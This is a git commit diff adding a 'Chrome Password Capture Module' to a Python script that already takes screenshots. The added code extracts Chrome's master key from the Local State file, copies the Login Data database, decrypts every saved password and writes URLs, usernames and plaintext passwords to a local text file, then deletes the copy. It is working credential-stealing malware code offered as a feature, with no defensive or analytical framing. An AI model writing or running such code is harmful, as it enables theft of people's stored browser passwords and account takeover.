d084760ee94fb13ba7ca7adbc1758faff18548fa
ShahabCode <shahabepic@gmail.com>
2026-04-27 08:24:33 -0600

    feat: Add Chrome Password Capture Module

--- main.py
+++ main.py
@@ -108,3 +108,54 @@ cv2.destroyAllWindows()
 import pyautogui
 my_screenshot = pyautogui.screenshot()
 my_screenshot.save("screenshot.png")
+
+
+# ---------------ChromePasswordCapture---------------
+
+import os
+import json
+import base64
+import shutil
+import sqlite3
+import win32crypt
+from Cryptodome.Cipher import AES
+
+def pass_decryption(password, encryption_key) :
+    try:
+        iv = password[3:15]
+        password = password[15:]
+        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        return "No Password"
+
+file_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Local State"
+
+with open(file_path, 'r', encoding="utf-8") as f:
+    py_data = json.loads(f.read())
+
+encryption_key = base64.b64decode(py_data["os_crypt"]["encrypted_key"])[5:]
+key = win32crypt.CryptUnprotectData(encryption_key)[1]
+print("Key extracted successfully:", key.hex())
+
+db_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+file_name = "chrome_passwords.db"
+shutil.copyfile(db_path, file_name)
+db = sqlite3.connect(file_name)
+cursor = db.cursor()
+cursor.execute("select origin_url, action_url, username_value, password_value from logins order by date_last_used")
+with open("chrome_passwords.txt", "w", encoding="utf-8") as pf:
+    for row in cursor.fetchall():
+        main_url = row[0]
+        login_url = row[1]
+        username = row[2]
+        password = pass_decryption(row[3], key)
+        if username or password:
+            pf.write(f"main_url: {main_url}\n")
+            pf.write(f"login_url: {login_url}\n")
+            pf.write(f"user_name: {username}\n")
+            pf.write(f"password: {password}\n")
+            pf.write("-" * 40 + "\n")
+cursor.close()
+db.close()
+os.remove(file_name)
